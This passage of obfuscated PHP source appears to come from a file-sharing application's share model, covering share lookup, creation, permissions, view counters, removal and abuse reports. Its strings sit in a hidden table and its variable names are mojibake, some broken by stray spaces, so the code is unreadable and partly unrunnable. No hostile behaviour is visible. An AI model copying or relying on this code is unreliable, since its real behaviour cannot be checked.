array($Ú€¼‰›Ø[1529] => USER_ID, $Ú€¼‰›Ø[192] => $·¡Òşâ); return $this->_getShareInfo($ƒá¼áØ³); } public function getInfoBySourcePath($Ñ…ÁŠˆã) { $õà°Ê” =& $_SERVER[¿ÈˆÑ¸ä]; $ĞËëñ·´ = array($õà°Ê”[1529] => USER_ID, $õà°Ê”[579] => $Ñ…ÁŠˆã); return $this->_getShareInfo($ĞËëñ·´); } private function _getShareInfo($¤…Ş¿üğ, $ÙùŸŸ²Ğ = true) { $äÙ¡á¨ñ =& $_SERVER[¿ÈˆÑ¸ä]; $¾ôèçä° = $this->where($¤…Ş¿üğ)->find(); if (!$¾ôèçä°) { return !1; } if (!is_array($¾ôèçä°[$äÙ¡á¨ñ[576]])) { $¾ôèçä°[$äÙ¡á¨ñ[576]] = array(); } $¤…Ş¿üğ = array($äÙ¡á¨ñ[684] => $¾ôèçä°[$äÙ¡á¨ñ[684]]); $†óöú¢ = $äÙ¡á¨ñ[2265]; $¾ôèçä°[$äÙ¡á¨ñ[1487]] = Model($äÙ¡á¨ñ[685])->order($äÙ¡á¨ñ[483])->field($†óöú¢)->where($¤…Ş¿üğ)->select(); if (!$ÙùŸŸ²Ğ) { return $¾ôèçä°; } return $this->shareSourceInfo($¾ôèçä°); } private function shareSourceInfo($¦“¸‹¤¾) { $•ƒîêòª =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($¦“¸‹¤¾)) { return $¦“¸‹¤¾; } if ($¦“¸‹¤¾[$•ƒîêòª[192]] == $•ƒîêòª[229]) { $¦“¸‹¤¾[$•ƒîêòª[90]] = IO::info($¦“¸‹¤¾[$•ƒîêòª[579]]); } else { $¦“¸‹¤¾[$•ƒîêòª[90]] = Model($•ƒîêòª[1469])->pathInfo($¦“¸‹¤¾[$•ƒîêòª[192]]); } return $¦“¸‹¤¾; } protected function getInfoAuth($¿¨ñ¸ô½) { $³Ü‚Ú† =& $_SERVER[¿ÈˆÑ¸ä]; $û¤“Å¹ê = $this->getInfo($¿¨ñ¸ô½); if ($û¤“Å¹ê[$³Ü‚Ú†[1529]] == USER_ID) { $û¤“Å¹ê[$³Ü‚Ú†[498]] = $û¤“Å¹ê[$³Ü‚Ú†[90]][$³Ü‚Ú†[498]]; } else { $û¤“Å¹ê[$³Ü‚Ú†[498]] = Model($³Ü‚Ú†[583])->authMake($û¤“Å¹ê[$³Ü‚Ú†[1487]]); } return $û¤“Å¹ê; } protected function listData($åğê¶ÀÚ = null, $É¼ıç­Œ = 300) { $ëñ©ı™Ë =& $_SERVER[¿ÈˆÑ¸ä]; $¶á«Êá· = array(array($ëñ©ı™Ë[574] => array($ëñ©ı™Ë[1115], 0), $ëñ©ı™Ë[682] => array($ëñ©ı™Ë[1115], 0), $ëñ©ı™Ë[2266] => $ëñ©ı™Ë[2222])); if ($åğê¶ÀÚ == $ëñ©ı™Ë[2267]) { $¶á«Êá· = array($ëñ©ı™Ë[574] => 1); } else { if ($åğê¶ÀÚ == $ëñ©ı™Ë[1280]) { $¶á«Êá· = array($ëñ©ı™Ë[682] => 1); } } $¶á«Êá·[$ëñ©ı™Ë[1529]] = USER_ID; $•¶İàÀ¤ = $this->where($¶á«Êá·)->selectPage($É¼ıç­Œ); return $•¶İàÀ¤; } protected function listToMe($æµ²ùâ = 300) { $•ß¼ç„… =& $_SERVER[¿ÈˆÑ¸ä]; $½Øçâµ¹ = Model($•ß¼ç„…[2268])->userGroupParents(USER_ID); $œì‘ÜšŠ = array($•ß¼ç„…[667] => SourceModel::TYPE_USER, $•ß¼ç„…[585] => USER_ID); if ($½Øçâµ¹) { $œì‘ÜšŠ = array(array($•ß¼ç„…[667] => SourceModel::TYPE_USER, $•ß¼ç„…[585] => USER_ID), array($•ß¼ç„…[667] => SourceModel::TYPE_GROUP, $•ß¼ç„…[585] => array($•ß¼ç„…[7], $½Øçâµ¹)), $•ß¼ç„…[2266] => $•ß¼ç„…[2222]); } $Äïé´È« = Model($•ß¼ç„…[685])->where($œì‘ÜšŠ)->selectPage($æµ²ùâ); $³‹èƒ = array_to_keyvalue_group($Äïé´È«[$•ß¼ç„…[446]], $•ß¼ç„…[684]); if (!$³‹èƒ) { return $Äïé´È«; } $âÚ’Ìé = $•ß¼ç„…[2269]; $œì‘ÜšŠ = array($•ß¼ç„…[684] => array($•ß¼ç„…[503], array_keys($³‹èƒ))); $ãÄÇ«› = $this->field($âÚ’Ìé)->where($œì‘ÜšŠ)->select(); foreach ($ãÄÇ«› as $§ŞĞ óÄ => &$ış‰£‡º) { $ış‰£‡º[$•ß¼ç„…[1487]] = $³‹èƒ[$ış‰£‡º[$•ß¼ç„…[684]]]; } unset($ış‰£‡º); $šÀ®®ä¹ = array($•ß¼ç„…[2270] => $ãÄÇ«›, $•ß¼ç„…[2271] => $Äïé´È«[$•ß¼ç„…[443]]); return $šÀ®®ä¹; } protected function shareAdd($Êèµ²·Î, $ì³Ú°©Ÿ) { $—é¦š±ê =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÛƒä = $this->_addShareData($Êèµ²·Î, $ì³Ú°©Ÿ); if (!empty($ì³Ú°©Ÿ[$—é¦š±ê[2272]])) { $this->_shareAuthSet($ÛÛƒä, $ì³Ú°©Ÿ[$—é¦š±ê[2272]]); } $this->shareEventAdd($Êèµ²·Î, $ì³Ú°©Ÿ, $—é¦š±ê[2273]); return $ÛÛƒä; } protected function shareAddSystem($¨´´ıÅÇ, $Õù¼Ğœ ) { $Íä¦È’ =& $_SERVER[¿ÈˆÑ¸ä]; $ûŞíÄ†à = $this->_addShareData($¨´´ıÅÇ, $Õù¼Ğœ , $Íä¦È’[190]); $this->_shareAuthSet($ûŞíÄ†à, $Õù¼Ğœ [$Íä¦È’[2272]]); return $ûŞíÄ†à; } private function shareEventAdd($ê“´·ô, $‡ğœ¢», $ÔÂ…‹‡Š = "\x61\144\144") { $‚ÃûÖšƒ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ê“´·ô || $ê“´·ô == $‚ÃûÖšƒ[229]) { return; } if ($ÔÂ…‹‡Š == $‚ÃûÖšƒ[2273]) { if ($‡ğœ¢»[$‚ÃûÖšƒ[574]] == $‚ÃûÖšƒ[91]) { Model($‚ÃûÖšƒ[652])->eventShare($ê“´·ô, $‚ÃûÖšƒ[2274]); } if ($‡ğœ¢»[$‚ÃûÖšƒ[682]] == $‚ÃûÖšƒ[91]) { Model($‚ÃûÖšƒ[652])->eventShare($ê“´·ô, $‚ÃûÖšƒ[2275]); } return; } $Ù‡¦Ëšõ = $this->getInfoByPath($ê“´·ô); $öÊåå²ã = $‚ÃûÖšƒ[2276]; if ($Ù‡¦Ëšõ[$‚ÃûÖšƒ[574]] == $‚ÃûÖšƒ[229] && $‡ğœ¢»[$‚ÃûÖšƒ[574]] == $‚ÃûÖšƒ[91]) { $öÊåå²ã = $‚ÃûÖšƒ[2274]; } if ($Ù‡¦Ëšõ[$‚ÃûÖšƒ[574]] == $‚ÃûÖšƒ[91] && $‡ğœ¢»[$‚ÃûÖšƒ[574]] == $‚ÃûÖšƒ[229]) { $öÊåå²ã = $‚ÃûÖšƒ[2277]; } if ($Ù‡¦Ëšõ[$‚ÃûÖšƒ[682]] == $‚ÃûÖšƒ[229] && $‡ğœ¢»[$‚ÃûÖšƒ[682]] == $‚ÃûÖšƒ[91]) { $öÊåå²ã = $‚ÃûÖšƒ[2275]; } if ($Ù‡¦Ëšõ[$‚ÃûÖšƒ[682]] == $‚ÃûÖšƒ[91] && $‡ğœ¢»[$‚ÃûÖšƒ[682]] == $‚ÃûÖšƒ[229]) { $öÊåå²ã = $‚ÃûÖšƒ[2278]; } Model($‚ÃûÖšƒ[652])->eventShare($ê“´·ô, $öÊåå²ã); return; } private function _addShareData($»ÕßÒãÛ, $×˜ÓÀ³ı = array(), $ûö¥ã› = false) { $¢¸ûæî =& $_SERVER[¿ÈˆÑ¸ä]; $¢†¢ÒÂƒ = $ûö¥ã› == $¢¸ûæî[190] ? 0 : USER_ID; $¨î›ó¹§ = array($¢¸ûæî[502] => $»ÕßÒãÛ, $¢¸ûæî[1907] => $¢†¢ÒÂƒ); if ($»ÕßÒãÛ == 0) { $¨î›ó¹§ = array($¢¸ûæî[2279] => $×˜ÓÀ³ı[$¢¸ûæî[579]], $¢¸ûæî[1907] => $¢†¢ÒÂƒ); } if ($ÅşÅ±Ã… = $this->where($¨î›ó¹§)->find()) { return $ÅşÅ±Ã…[$¢¸ûæî[684]]; } if ($»ÕßÒãÛ == 0) { $ºóğ = array($¢¸ûæî[32] => get_path_this($×˜ÓÀ³ı[$¢¸ûæî[87]])); } else { $ºóğ = Model($¢¸ûæî[916])->sourceInfo($»ÕßÒãÛ); if (!$ºóğ) { return !1; } } if (!$×˜ÓÀ³ı[$¢¸ûæî[1802]]) { $×˜ÓÀ³ı[$¢¸ûæî[1802]] = $ºóğ[$¢¸ûæî[32]]; } $—üºîú– = array($¢¸ûæî[1907] => $¢†¢ÒÂƒ, $¢¸ûæî[502] => $»ÕßÒãÛ, $¢¸ûæî[1802] => $¢¸ûæî[12], $¢¸ûæî[574] => 0, $¢¸ûæî[682] => 0, $¢¸ûæî[579] => $¢¸ûæî[12], $¢¸ûæî[383] => $¢¸ûæî[12], $¢¸ûæî[989] => $¢¸ûæî[12], $¢¸ûæî[2280] => 0, $¢¸ûæî[2281] => 0, $¢¸ûæî[845] => 0, $¢¸ûæî[576] => $¢¸ûæî[12], $¢¸ûæî[1491] => $¢¸ûæî[12]); $¿äùªó = explode($¢¸ûæî[50], $¢¸ûæî[2282]); foreach ($¿äùªó as $ôùšïà) { if (!isset($×˜ÓÀ³ı[$ôùšïà])) { continue; } $—üºîú–[$ôùšïà] = $×˜ÓÀ³ı[$ôùšïà]; } $š¼ı¾–µ = $this->add($—üºîú–); $Úó»òç¹ = array($¢¸ûæî[1491] => short_id($š¼ı¾–µ)); if ($this->where($Úó»òç¹)->find()) { $Úó»òç¹[$¢¸ûæî[1491]] .= $¢¸ûæî[473] . rand_string(2, 3); } $this->where(array($¢¸ûæî[2283] => $š¼ı¾–µ))->save($Úó»òç¹); return $š¼ı¾–µ; } private function _shareAuthSet($°òµÌâ, $‹õ—•ô) { $‘¶ù“İ =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($‹õ—•ô)) { return !1; } $½´î®ÀÏ = Model($‘¶ù“İ[2231]); $½´î®ÀÏ->where(array($‘¶ù“İ[684] => $°òµÌâ))->delete(); $·ôçÓà„ = array(); foreach ($‹õ—•ô as $ù›ı¥Ÿ˜) { $ŒƒæòĞ = SourceModel::TYPE_USER; if ($ù›ı¥Ÿ˜[$‘¶ù“İ[189]] == SourceModel::TYPE_GROUP) { $ŒƒæòĞ = SourceModel::TYPE_GROUP; } $Æ­¤ÕÉ¢ = array($‘¶ù“İ[684] => $°òµÌâ, $‘¶ù“İ[189] => $ŒƒæòĞ, $‘¶ù“İ[585] => intval($ù›ı¥Ÿ˜[$‘¶ù“İ[585]]), $‘¶ù“İ[1576] => 0, $‘¶ù“İ[2284] => -1); if ($ù›ı¥Ÿ˜[$‘¶ù“İ[1576]]) { $Æ­¤ÕÉ¢[$‘¶ù“İ[1576]] = $ù›ı¥Ÿ˜[$‘¶ù“İ[1576]]; } else { if ($ù›ı¥Ÿ˜[$‘¶ù“İ[2284]]) { $Æ­¤ÕÉ¢[$‘¶ù“İ[2284]] = $ù›ı¥Ÿ˜[$‘¶ù“İ[2284]]; } } $·ôçÓà„[] = $Æ­¤ÕÉ¢; } return $½´î®ÀÏ->addAll($·ôçÓà„, array(), !0); } public function numViewAdd($ß¿ùÓÌÆ) { $ˆ¹ÕÔ×´ =& $_SERVER[¿ÈˆÑ¸ä]; $ÃóÅàß = array($ˆ¹ÕÔ×´[2283] => $ß¿ùÓÌÆ); $this->where($ÃóÅàß)->setAdd($ˆ¹ÕÔ×´[2280]); } public function numDownloadAdd($éÈÈ¨ó) { $Ÿ©ŒüÇæ =& $_SERVER[¿ÈˆÑ¸ä]; $İ†Ÿª¯ = array($Ÿ©ŒüÇæ[2283] => $éÈÈ¨ó); $this->where($İ†Ÿª¯)->setAdd($Ÿ©ŒüÇæ[2281]); } protected function shareEdit($Œïæóç¥, $û‰á„¸Á) { $À½õÔÒŠ =& $_SERVER[¿ÈˆÑ¸ä]; $Ùú¥Å—÷ = $this->getInfo($Œïæóç¥); if (!$Ùú¥Å—÷) { return !1; } if ($û‰á„¸Á[$À½õÔÒŠ[1491]] && $û‰á„¸Á[$À½õÔÒŠ[574]] == $À½õÔÒŠ[91]) { if ($û‰á„¸Á[$À½õÔÒŠ[1491]] == $Ùú¥Å—÷[$À½õÔÒŠ[1491]]) { unset($û‰á„¸Á[$À½õÔÒŠ[1491]]); } if ($û‰á„¸Á[$À½õÔÒŠ[1491]]) { $²Á¾º = $this->where(array($À½õÔÒŠ[2285] => $û‰á„¸Á[$À½õÔÒŠ[1491]]))->find(); if ($²Á¾º) { return !1; } if (!is_array($û‰á„¸Á[$À½õÔÒŠ[576]])) { $û‰á„¸Á[$À½õÔÒŠ[576]] = is_array($Ùú¥Å—÷[$À½õÔÒŠ[576]]) ? $Ùú¥Å—÷[$À½õÔÒŠ[576]] : array(); } if (!$û‰á„¸Á[$À½õÔÒŠ[576]][$À½õÔÒŠ[2286]]) { $û‰á„¸Á[$À½õÔÒŠ[576]][$À½õÔÒŠ[2286]] = $Ùú¥Å—÷[$À½õÔÒŠ[1491]]; $û‰á„¸Á[$À½õÔÒŠ[576]][$À½õÔÒŠ[2287]] = $À½õÔÒŠ[91]; } } } $this->_checkLinkShare($û‰á„¸Á, $Ùú¥Å—÷); $Ûì‘Š©š = array(); $¬ğæ‚œİ = explode($À½õÔÒŠ[50], $À½õÔÒŠ[2288]); foreach ($¬ğæ‚œİ as $¡«ó¥») { if (!array_key_exists($¡«ó¥», $û‰á„¸Á)) { continue; } $Ûì‘Š©š[$¡«ó¥»] = $û‰á„¸Á[$¡«ó¥»]; } $this->shareEventAdd($Ùú¥Å—÷[$À½õÔÒŠ[192]], $û‰á„¸Á, $À½õÔÒŠ[1498]); $this->where(array($À½õÔÒŠ[2283] => $Œïæóç¥))->save($Ûì‘Š©š); if (isset($û‰á„¸Á[$À½õÔÒŠ[2272]])) { $this->_shareAuthSet($Œïæóç¥, $û‰á„¸Á[$À½õÔÒŠ[2272]]); } return !0; } private function _checkLinkShare($Ìû×‹¹, $ëŒ¬Şø) { $øÆÑßü× =& $_SERVER[¿ÈˆÑ¸ä]; if ($Ìû×‹¹[$øÆÑßü×[574]] != $øÆÑßü×[91]) { return; } $”Ğ·Òş = $ëŒ¬Şø[$øÆÑßü×[90]][$øÆÑßü×[192]]; if ($ëŒ¬Şø[$øÆÑßü×[90]][$øÆÑßü×[33]] != $øÆÑßü×[231]) { $óÜÍìÁ = $this->_folderReport($”Ğ·Òş); if (!$óÜÍìÁ) { return; } show_json(LNG($øÆÑßü×[2289]) . $øÆÑßü×[2290] . $óÜÍìÁ, !1); } $í›ïªÛ = Model($øÆÑßü×[916])->fileInfoGet($ëŒ¬Şø[$øÆÑßü×[90]][$øÆÑßü×[192]]); if (!$í›ïªÛ) { return; } $èŸŞÜì = $this->shareFileMeta($í›ïªÛ[$øÆÑßü×[553]]); if (isset($èŸŞÜì[$øÆÑßü×[451]]) && $èŸŞÜì[$øÆÑßü×[451]] == $øÆÑßü×[91]) { show_json(LNG($øÆÑßü×[2291]), !1); } } private function _folderReport($ó»“À¿Ã) { $ãçÀéã© =& $_SERVER[¿ÈˆÑ¸ä]; $«ôæ¹×Ÿ = array($ãçÀéã©[553] => array($ãçÀéã©[1115], 0), $ãçÀéã©[833] => 3); $æªØ›Ò = Model($ãçÀéã©[2292])->where($«ôæ¹×Ÿ)->field($ãçÀéã©[553])->select(); if (!$æªØ›Ò) { return !1; } $æªØ›Ò = array_to_keyvalue($æªØ›Ò, $ãçÀéã©[12], $ãçÀéã©[553]); $·Šü°’ = $ãçÀéã©[50] . $ó»“À¿Ã . $ãçÀéã©[50]; $«ôæ¹×Ÿ = array($ãçÀéã©[553] => array($ãçÀéã©[7], $æªØ›Ò), $ãçÀéã©[600] => array($ãçÀéã©[470], "\45{$·Šü°’}\45"), $ãçÀéã©[516] => 0); $Ï§ËÄÚ = Model($ãçÀéã©[916])->where($«ôæ¹×Ÿ)->field($ãçÀéã©[2293])->find(); if (!$Ï§ËÄÚ) { return !1; } $“­¯ãà = substr($Ï§ËÄÚ[$ãçÀéã©[600]], strpos($Ï§ËÄÚ[$ãçÀéã©[600]], $·Šü°’)); $«ôæ¹×Ÿ = array($ãçÀéã©[192] => array($ãçÀéã©[7], trim($“­¯ãà, $ãçÀéã©[50]))); $Áªæš = Model($ãçÀéã©[916])->where($«ôæ¹×Ÿ)->field($ãçÀéã©[32])->select(); $ÂöäÅØÆ = array_to_keyvalue($Áªæš, $ãçÀéã©[12], $ãçÀéã©[32]); $ÂöäÅØÆ[] = $Ï§ËÄÚ[$ãçÀéã©[32]]; return implode($ãçÀéã©[8], $ÂöäÅØÆ); } protected function remove($ôƒÔ‚ªô) { $ëë²ÉÒ =& $_SERVER[¿ÈˆÑ¸ä]; $Ÿ„şµô = is_array($ôƒÔ‚ªô) ? $ôƒÔ‚ªô : array($ôƒÔ‚ªô); for ($¨âùÕôÀ = 0; $¨âùÕôÀ < count($Ÿ„şµô); $¨âùÕôÀ++) { $é—ˆö–Ù = $this->getInfo($Ÿ„şµô[$¨âùÕôÀ]); if ($é—ˆö–Ù[$ëë²ÉÒ[682]] == $ëë²ÉÒ[91]) { Model($ëë²ÉÒ[652])->eventShare($é—ˆö–Ù[$ëë²ÉÒ[192]], $ëë²ÉÒ[2278]); } if ($é—ˆö–Ù[$ëë²ÉÒ[574]] == $ëë²ÉÒ[91]) { Model($ëë²ÉÒ[652])->eventShare($é—ˆö–Ù[$ëë²ÉÒ[192]], $ëë²ÉÒ[2277]); } } $õ¾ÑİÑº = array($ëë²ÉÒ[684] => array($ëë²ÉÒ[7], $Ÿ„şµô)); $§„É²¸” = $this->where($õ¾ÑİÑº)->delete(); if ($§„É²¸”) { Model($ëë²ÉÒ[685])->where($õ¾ÑİÑº)->delete(); } return $§„É²¸”; } protected function removeBySource($Ñ¤ÊÄğÁ) { $ò…ì‹¯¤ =& $_SERVER[¿ÈˆÑ¸ä]; $´¼Òş¸À = array($ò…ì‹¯¤[502] => array($ò…ì‹¯¤[503], $Ñ¤ÊÄğÁ)); $úİæò¥À = $this->field($ò…ì‹¯¤[684])->where($´¼Òş¸À)->select(); $É·»‰ü = array_to_keyvalue($úİæò¥À, $ò…ì‹¯¤[12], $ò…ì‹¯¤[684]); if (!$É·»‰ü) { return; } foreach ($úİæò¥À as $èÓøÖ…) { $this->shareInfoMofify($èÓøÖ…, $ò…ì‹¯¤[2294]); } $´¼Òş¸À = array($ò…ì‹¯¤[2283] => array($ò…ì‹¯¤[503], $É·»‰ü)); $this->where($´¼Òş¸À)->delete(); Model($ò…ì‹¯¤[685])->where($´¼Òş¸À)->delete(); } public function listAll($ùÅ‘Íğµ) { $Üû¬Ü· =& $_SERVER[¿ÈˆÑ¸ä]; $¶˜Ãñ¢× = array(); if ($ùÅ‘Íğµ[$Üû¬Ü·[1529]]) { $¶˜Ãñ¢×[$Üû¬Ü·[1529]] = $ùÅ‘Íğµ[$Üû¬Ü·[1529]]; } if ($ùÅ‘Íğµ[$Üû¬Ü·[844]]) { $ëÅÃÓŸ¡ = $ùÅ‘Íğµ[$Üû¬Ü·[845]] ? $ùÅ‘Íğµ[$Üû¬Ü·[845]] : strtotime(date($Üû¬Ü·[2295])); $¶˜Ãñ¢×[$Üû¬Ü·[232]] = array($Üû¬Ü·[409], array($ùÅ‘Íğµ[$Üû¬Ü·[844]], $ëÅÃÓŸ¡)); } if ($ùÅ‘Íğµ[$Üû¬Ü·[33]]) { $¶˜Ãñ¢×[$ùÅ‘Íğµ[$Üû¬Ü·[33]]] = 1; } else { $¶˜Ãñ¢×[] = array($Üû¬Ü·[574] => array($Üû¬Ü·[1115], 0), $Üû¬Ü·[682] => array($Üû¬Ü·[1115], 0), $Üû¬Ü·[2266] => $Üû¬Ü·[2222]); } if ($ùÅ‘Íğµ[$Üû¬Ü·[2218]]) { $¶˜Ãñ¢×[] = array($Üû¬Ü·[1491] => $ùÅ‘Íğµ[$Üû¬Ü·[2218]], $Üû¬Ü·[1802] => array($Üû¬Ü·[470], "\x25{$ùÅ‘Íğµ[$Üû¬Ü·[2218]]}\45"), $Üû¬Ü·[2266] => $Üû¬Ü·[2222]); } $Ü›ƒ«ô› = $this->_makeOrder()->where($¶˜Ãñ¢×)->selectPage(20); if (empty($Ü›ƒ«ô›[$Üû¬Ü·[446]])) { return array(); } $this->_listDataApply($Ü›ƒ«ô›[$Üû¬Ü·[446]]); return $Ü›ƒ«ô›; } public function listDataApply($‰Àã†”„) { $this->_listDataApply($‰Àã†”„); return $‰Àã†”„; } private function _listDataApply(&$£‘¢¹ŠÛ) { $“Œî¨§— =& $_SERVER[¿ÈˆÑ¸ä]; $èíìƒ¼¯ = array_to_keyvalue($£‘¢¹ŠÛ, $“Œî¨§—[12], $“Œî¨§—[1529]); $¼öÛôöÍ = Model($“Œî¨§—[613])->userListInfo(array_unique($èíìƒ¼¯)); $ĞÜí÷¥ = array_to_keyvalue($£‘¢¹ŠÛ, $“Œî¨§—[12], $“Œî¨§—[192]); $Ç’–©„¯ = Model($“Œî¨§—[916])->sourceListInfo($ĞÜí÷¥, !0); foreach ($£‘¢¹ŠÛ as $›İÙŠç® => &$×øÁŒ¤Â) { $¾ß‰÷“³ = $×øÁŒ¤Â[$“Œî¨§—[1529]]; $×øÁŒ¤Â[$“Œî¨§—[2296]] = $¼öÛôöÍ[$¾ß‰÷“³] ? $¼öÛôöÍ[$¾ß‰÷“³] : !1; if (!$×øÁŒ¤Â[$“Œî¨§—[2296]] || $×øÁŒ¤Â[$“Œî¨§—[2296]][$“Œî¨§—[833]] != $“Œî¨§—[91]) { unset($£‘¢¹ŠÛ[$›İÙŠç®]); continue; } $’½Ê®êî = $×øÁŒ¤Â[$“Œî¨§—[192]]; $×øÁŒ¤Â[$“Œî¨§—[90]] = $Ç’–©„¯[$’½Ê®êî] ? $Ç’–©„¯[$’½Ê®êî] : !1; if ($×øÁŒ¤Â[$“Œî¨§—[90]][$“Œî¨§—[516]] == $“Œî¨§—[91]) { unset($£‘¢¹ŠÛ[$›İÙŠç®]); } if ($×øÁŒ¤Â[$“Œî¨§—[90]] != $“Œî¨§—[229] && !$×øÁŒ¤Â[$“Œî¨§—[90]]) { unset($£‘¢¹ŠÛ[$›İÙŠç®]); } } unset($×øÁŒ¤Â); $£‘¢¹ŠÛ = array_values($£‘¢¹ŠÛ); } private function _makeOrder($¾¹˜°Ğ = '') { $Ğ‹ğ„«ö =& $_SERVER[¿ÈˆÑ¸ä]; $üĞµ’í× = array($Ğ‹ğ„«ö[232], $Ğ‹ğ„«ö[845], $Ğ‹ğ„«ö[2280], $Ğ‹ğ„«ö[2281]); $¼ñéãƒ· = array($Ğ‹ğ„«ö[533] => $Ğ‹ğ„«ö[534], $Ğ‹ğ„«ö[535] => $Ğ‹ğ„«ö[536]); $’É²àè = Input::get($Ğ‹ğ„«ö[540], $Ğ‹ğ„«ö[7], $Ğ‹ğ„«ö[508], $üĞµ’í×); $šáı¥Â = Input::get($Ğ‹ğ„«ö[541], $Ğ‹ğ„«ö[7], $Ğ‹ğ„«ö[2297], array($Ğ‹ğ„«ö[2215], $Ğ‹ğ„«ö[535])); $šáı¥Â = $¼ñéãƒ·[$šáı¥Â]; $¾¹˜°Ğ = $¾¹˜°Ğ . "{$’É²àè}\x20{$šáı¥Â}"; return $this->order($¾¹˜°Ğ); } public function reportAdd($Ò‡·ñĞº) { $øÇĞ“«ˆ =& $_SERVER[¿ÈˆÑ¸ä]; $É¸¬Ÿ… = array($øÇĞ“«ˆ[684] => $Ò‡·ñĞº[$øÇĞ“«ˆ[684]], $øÇĞ“«ˆ[1529] => USER_ID); if (Model($øÇĞ“«ˆ[2292])->where($É¸¬Ÿ…)->find()) { return !1; } $‰Ÿò½Èß = array($øÇĞ“«ˆ[684] => $Ò‡·ñĞº[$øÇĞ“«ˆ[684]], $øÇĞ“«ˆ[1802] => $Ò‡·ñĞº[$øÇĞ“«ˆ[1802]], $øÇĞ“«ˆ[192] => $Ò‡·ñĞº[$øÇĞ“«ˆ[192]], $øÇĞ“«ˆ[553] => $Ò‡·ñĞº[$øÇĞ“«ˆ[553]], $øÇĞ“«ˆ[1529] => USER_ID, $øÇĞ“«ˆ[33] => $Ò‡·ñĞº[$øÇĞ“«ˆ[33]], $øÇĞ“«ˆ[536] => $Ò‡·ñĞº[$øÇĞ“«ˆ[536]]); return Model($øÇĞ“«ˆ[2292])->add($‰Ÿò½Èß); } public function reportList($Á‘º‚Úƒ) { $ûÓŸ¸´Ï =& $_SERVER[¿ÈˆÑ¸ä]; $Î­«ìˆ­ = array(); if ($Á‘º‚Úƒ[$ûÓŸ¸´Ï[844]]) { $ÍşÏŸ› = $Á‘º‚Úƒ[$ûÓŸ¸´Ï[845]] ? $Á‘º‚Úƒ[$ûÓŸ¸´Ï[845]] : strtotime(date($ûÓŸ¸´Ï[2295])); $Î­«ìˆ­[$ûÓŸ¸´Ï[232]] = array($ûÓŸ¸´Ï[409], array($Á‘º‚Úƒ[$ûÓŸ¸´Ï[844]], $ÍşÏŸ›)); } if (isset($Á‘º‚Úƒ[$ûÓŸ¸´Ï[33]]) && in_array($Á‘º‚Úƒ[$ûÓŸ¸´Ï[33]], array($ûÓŸ¸´Ï[91], $ûÓŸ¸´Ï[520], $ûÓŸ¸´Ï[2298], $ûÓŸ¸´Ï[2299], $ûÓŸ¸´Ï[2300]))) { $Î­«ìˆ­[$ûÓŸ¸´Ï[33]] = $Á‘º‚Úƒ[$ûÓŸ¸´Ï[33]]; } if (isset($Á‘º‚Úƒ[$ûÓŸ¸´Ï[833]]) && in_array($Á‘º‚Úƒ[$ûÓŸ¸´Ï[833]], array($ûÓŸ¸´Ï[229], $ûÓŸ¸´Ï[91], $ûÓŸ¸´Ï[520], $ûÓŸ¸´Ï[2298]))) { $Î­«ìˆ­[$ûÓŸ¸´Ï[833]] = $Á‘º‚Úƒ[$ûÓŸ¸´Ï[833]]; } $¾Ÿ«ºÄØ = Input::get($ûÓŸ¸´Ï[541], $ûÓŸ¸´Ï[7], $ûÓŸ¸´Ï[2297], array($ûÓŸ¸´Ï[2215], $ûÓŸ¸´Ï[535])); $ĞÄøªÛÕ = array($ûÓŸ¸´Ï[533] => $ûÓŸ¸´Ï[534], $ûÓŸ¸´Ï[535] => $ûÓŸ¸´Ï[536]); $ºË´¬Ûß = $ûÓŸ¸´Ï[2301] . $ĞÄøªÛÕ[$¾Ÿ«ºÄØ]; $åéìé”â = Model($ûÓŸ¸´Ï[2292])->where($Î­«ìˆ­)->order($ºË´¬Ûß)->selectPage(20); if (empty($åéìé”â[$ûÓŸ¸´Ï[446]])) { return array(); } $‘í–Ÿùş = array_to_keyvalue_group($åéìé”â[$ûÓŸ¸´Ï[446]], $ûÓŸ¸´Ï[833], $ûÓŸ¸´Ï[684]); if (!empty($‘í–Ÿùş[0])) { $Á‘º‚Úƒ = $‘í–Ÿùş[0]; $Î­«ìˆ­ = array($ûÓŸ¸´Ï[684] => array($ûÓŸ¸´Ï[7], $Á‘º‚Úƒ)); $¾‘ùŒÁ› = $this->where($Î­«ìˆ­)->field($ûÓŸ¸´Ï[684])->select(); $¾‘ùŒÁ› = array_to_keyvalue($¾‘ùŒÁ›, $ûÓŸ¸´Ï[12], $ûÓŸ¸´Ï[684]); $ƒªòøÁ = array_diff($Á‘º‚Úƒ, $¾‘ùŒÁ›); if (!empty($ƒªòøÁ)) { foreach ($åéìé”â[$ûÓŸ¸´Ï[446]] as $ó¤·Óì => $°àú©ú„) { if (in_array($°àú©ú„[$ûÓŸ¸´Ï[684]], $ƒªòøÁ)) { unset($åéìé”â[$ûÓŸ¸´Ï[446]][$ó¤·Óì]); } } } } $this->_listDataApply($åéìé”â[$ûÓŸ¸´Ï[446]]); return $åéìé”â; } public function reportStatus($¿„Á¾İŞ) { $¦øÉ¹Æƒ =& $_SERVER[¿ÈˆÑ¸ä]; $çÍ¾íâÔ = array($¦øÉ¹Æƒ[483] => $¿„Á¾İŞ[$¦øÉ¹Æƒ[483]]); $©Ô…äï = Model($¦øÉ¹Æƒ[2292])->where($çÍ¾íâÔ)->field($¦øÉ¹Æƒ[2302])->find(); if (!$©Ô…äï) { return !1; } $¨÷ÍŠ° = array($¦øÉ¹Æƒ[833] => $¿„Á¾İŞ[$¦øÉ¹Æƒ[833]]); if ($¿„Á¾İŞ[$¦øÉ¹Æƒ[833]] == $¦øÉ¹Æƒ[2298] && $©Ô…äï[$¦øÉ¹Æƒ[833]] == $¦øÉ¹Æƒ[2298]) { $¨÷ÍŠ°[$¦øÉ¹Æƒ[833]] = 0; } $­ó“¦…œ = Model($¦øÉ¹Æƒ[2292])->where($çÍ¾íâÔ)->save($¨÷ÍŠ°); if ($¿„Á¾İŞ[$¦øÉ¹Æƒ[833]] == $¦øÉ¹Æƒ[520]) { if ($©Ô…äï[$¦øÉ¹Æƒ[553]] != $¦øÉ¹Æƒ[229] && $this->shareFileMeta($©Ô…äï[$¦øÉ¹Æƒ[553]])) { $this->shareFileMeta($©Ô…äï[$¦øÉ¹Æƒ[553]], 0); } $this->remove($©Ô…äï[$¦øÉ¹Æƒ[684]]); return !0; } if ($­ó“¦…œ && $¿„Á¾İŞ[$¦øÉ¹Æƒ[833]] == $¦øÉ¹Æƒ[2298]) { $Âû†¦òª = 